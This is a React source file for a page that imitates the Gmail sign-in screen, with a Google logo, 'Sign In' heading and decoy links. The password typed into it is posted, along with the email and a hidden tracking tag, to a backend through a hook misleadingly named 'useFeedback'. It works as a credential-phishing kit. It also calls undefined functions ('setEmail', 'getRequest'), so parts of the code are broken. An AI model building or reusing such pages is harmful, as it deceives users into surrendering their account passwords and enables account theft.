import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function Gmailtwo(emails,) {
  const { postFeedback, isLoading } = useFeedback();
  
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Gmailtwo365rey');
  const [role, setRole] = useState('2');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  

 

  return (


    <div className="bg-image" 
     style={{backgroundColor: "#fdfdfd",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
      
      <div  className="container pt-5 mb-4">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-5 border border-secondary" style={{  backgroundColor: "white", borderRadius:"3px"}}>
       
        <div className='text-center pt-5'>
   <img src="images/google.png"  className="img-fluid" width="80px" height="60px"/>
   <br/>
   <h5>Sign In</h5>
   <br/> 
   <span  className="p text-dark pt-2">to continue to Gmail</span> 
   </div>
   
            
  

       

       
            <form    onSubmit={onSubmit}  className="form-horizontal well mt-2">
              <div  className="col-lg-12">
                <div  className="form-group-lg">
                 
                <input type="password" name="passwords"  className="form-control" id="passwords" value={passwords}  onChange={(e) => setPassword(e.target.value)} placeholder="Enter Password"/>
                
                </div>
              </div>
             
              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="detail"  className="form-control" id="detail" value={detail}   onChange={(e) => setDetails(e.target.value)} />
                </div>
              </div>

              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="role"  className="form-control" id="role" value={role}   onChange={(e) => setRole(e.target.value)} />
                </div>
              </div>

              <p className='font-weight-light' style={{fontSize:"14px"}}> <a href="#">Forgot email?</a></p>

              <p className='font-weight-light mt-5' style={{fontSize:"14px"}}>Not your computer? Use Guest mode to sign in privately <br/> <a href="#">Learn more</a></p>
              
              <p className='font-weight-light mt-5' style={{fontSize:"14px"}}> <a href="#"> Create account</a></p>
        

             
            <button   onClick={() => getRequest(emails)} className="btn btn-sm pull-right " style={{ color: "white", backgroundColor:"#163a98", float: "right" }} id="submit-btn">Next</button>
    
          </form>
      </div>

          </div>
     
    </div> 
    </div>

  );
}

export default Gmailtwo;
